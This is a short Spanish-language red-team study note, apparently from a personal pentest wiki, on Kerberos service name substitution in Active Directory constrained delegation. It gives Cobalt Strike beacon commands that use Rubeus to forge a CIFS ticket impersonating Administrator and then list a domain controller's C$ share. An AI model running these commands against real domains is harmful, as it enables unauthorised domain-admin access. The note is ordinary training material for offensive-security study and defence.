---
title: Kerberos — Service Name Substitution
tags: [kerberos, cobalt-strike, constrained-delegation, s4u]
---

# Service Name Substitution

> Si `msDS-AllowedToDelegateTo` solo tiene servicios inútiles (TIME, wsman...), puedes pedir ese ticket y **cambiarle el nombre** por CIFS, HOST, HTTP, etc.

Funciona porque el campo `sname` del ticket **no está cifrado ni firmado** — se puede sobreescribir. Único requisito: ambos servicios deben correr bajo la **misma cuenta**.

---

## Ataque

```
beacon> execute-assembly Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:<TGT_b64> /impersonateuser:Administrator /nowrap
```

| Parámetro | Valor |
|-----------|-------|
| `/msdsspn` | SPN permitido en la delegación (el inútil) |
| `/altservice` | Servicio que quieres realmente — acepta lista: `cifs,host,http` |
| `/impersonateuser` | Usuario a impersonar (cualquiera si protocol transition activo) |

```
beacon> execute-assembly Rubeus.exe createnetonly /program:cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<ST_b64>
beacon> steal_token <PID>
beacon> ls \\lon-dc-1\c$
```

---

## Ver también

- [[05-ad-attacks/kerberos/constrained-delegation|Constrained Delegation]]
- [[05-ad-attacks/ataques/silver-ticket|Silver Ticket]]
